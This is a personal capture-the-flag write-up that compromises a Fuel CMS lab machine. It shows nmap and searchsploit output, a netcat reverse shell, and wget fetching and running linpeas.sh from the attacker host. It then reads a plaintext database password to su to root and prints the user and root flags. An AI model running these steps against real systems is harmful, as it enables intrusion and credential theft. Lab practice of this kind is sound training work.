# CTF
A note containing my adventures and documentation for cyber security quests
# ignite

```
sudo nmap -sV -A -T5 http://10.10.86.239/
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry 
|_/fuel/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

```

```
─$ searchsploit fuel  
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
AMD Fuel Service - 'Fuel.service' Unquote Service Path                            | windows/local/49535.txt
Franklin Fueling Systems Colibri Controller Module 1.8.19.8580 - Local File Inclu | linux/remote/50861.txt
Franklin Fueling TS-550 evo 2.0.0.6833 - Multiple Vulnerabilities                 | hardware/webapps/31180.txt
fuel CMS 1.4.1 - Remote Code Execution (1)                                        | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                        | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                        | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                       | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                              | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                  | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)  

```
# trying different exploits
```
searchsploit -m php/webapps/49487.rb


```
# reverse_shell
```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.18.70.19] from (UNKNOWN) [10.10.86.239] 57222
Linux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 19:46:10 up  2:00,  0 users,  load average: 1.00, 1.01, 1.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami

```
# getting the user flag
```
www-data@ubuntu:/$ ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr
cdrom  home  lib             media       proc  sbin  sys   var
www-data@ubuntu:/$ ls /home/www-data    
ls /home/www-data
flag.txt
www-data@ubuntu:/$ cat /home/www-data/flag.txt  
cat /home/www-data/flag.txt
6470e394cbf6dab6a91682cc8585059b 
www-data@ubuntu:/$ 
```
# privilege escalation
```
┌──(aaron㉿kali)-[/opt]
└─$ ls                        
brave.com  LinEnum  linpeas.sh  microsoft  sherlock  sublime_text
                                                                                                                  
┌──(aaron㉿kali)-[/opt]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.86.239 - - [07/Feb/2023 22:55:31] "GET /linpeas.sh HTTP/1.1" 200 -

---> on the victim machine this is what I run

www-data@ubuntu:/$ cd /tmp
cd /tmp
www-data@ubuntu:/tmp$ wget 10.18.70.19:/linpeash.sh
wget 10.18.70.19:/linpeash.sh
--2023-02-07 19:55:59--  ftp://10.18.70.19//linpeash.sh
           => 'linpeash.sh'
Connecting to 10.18.70.19:21... failed: Connection refused.
www-data@ubuntu:/tmp$ ls
ls
VMwareDnD
systemd-private-a880ec89405d450d800fa91a9c7f58a5-colord.service-fKro5i
systemd-private-a880ec89405d450d800fa91a9c7f58a5-rtkit-daemon.service-XDWExQ
systemd-private-a880ec89405d450d800fa91a9c7f58a5-systemd-timesyncd.service-BvHTCW
www-data@ubuntu:/tmp$ wget 10.18.70.19:80/linpeas.sh
wget 10.18.70.19:80/linpeas.sh
--2023-02-07 19:56:33--  http://10.18.70.19/linpeas.sh
Connecting to 10.18.70.19:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828087 (809K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 808.68K   562KB/s    in 1.4s    

2023-02-07 19:56:35 (562 KB/s) - 'linpeas.sh' saved [828087/828087]

www-data@ubuntu:/tmp$ ls
ls
VMwareDnD
linpeas.sh
systemd-private-a880ec89405d450d800fa91a9c7f58a5-colord.service-fKro5i
systemd-private-a880ec89405d450d800fa91a9c7f58a5-rtkit-daemon.service-XDWExQ
systemd-private-a880ec89405d450d800fa91a9c7f58a5-systemd-timesyncd.service-BvHTCW
www-data@ubuntu:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@ubuntu:/tmp$ ./linpeas.sh
./linpeas.sh


www-data@ubuntu:/var/www/html/fuel/application/config$ ls
ls
MY_config.php        constants.php      google.php     profiler.php
MY_fuel.php          custom_fields.php  hooks.php      redirects.php
MY_fuel_layouts.php  database.php       index.html     routes.php
MY_fuel_modules.php  doctypes.php       memcached.php  smileys.php
asset.php            editors.php        migration.php  social.php
autoload.php         environments.php   mimes.php      states.php
config.php           foreign_chars.php  model.php      user_agents.php
www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php
cat database.php

active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

www-data@ubuntu:/var/www$ su root
su root
Password: mememe

root@ubuntu:/var/www# whoami
whoami
root
root@ubuntu:/var/www# ls /
ls /
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr
cdrom  home  lib             media       proc  sbin  sys   var
root@ubuntu:/var/www# ls /root
ls /root
root.txt
root@ubuntu:/var/www# cat /root/txt
cat /root/txt
cat: /root/txt: No such file or directory
root@ubuntu:/var/www# cat /root/root.txt
cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d 
root@ubuntu:/var/www# 


```







